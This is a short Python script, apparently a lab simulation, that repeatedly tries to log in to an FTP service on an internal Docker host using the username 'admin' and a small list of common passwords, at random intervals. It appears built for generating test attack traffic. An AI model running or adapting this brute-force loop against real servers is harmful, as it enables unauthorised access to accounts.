"""
Network-secured version of BruteForce/FtpBruteForce.py
Modified to use internal Docker network addresses only
"""

from ftplib import FTP
import time
import random

# SECURITY: Use internal Docker network address
target_ip = "consumer"  # Will fail safely - consumer doesn't run FTP
username = "admin"
passwords = ["1234", "admin", "ftp", "password"]

print(f"[FTP BruteForce] Starting FTP brute force simulation")
print(f"[FTP BruteForce] Target: {target_ip}:21")

while True:
    for pwd in passwords:
        try:
            print(f"[FTP BruteForce] Attempt: {username}:{pwd}")
            ftp = FTP(timeout=3)
            ftp.connect(target_ip, 21)
            ftp.login(user=username, passwd=pwd)
            ftp.quit()
            print(f"[FTP BruteForce] Success with: {pwd}")
        except Exception as e:
            print(f"[FTP BruteForce] Failed: {pwd} - {type(e).__name__}")
            continue

    time.sleep(random.randint(30, 90))
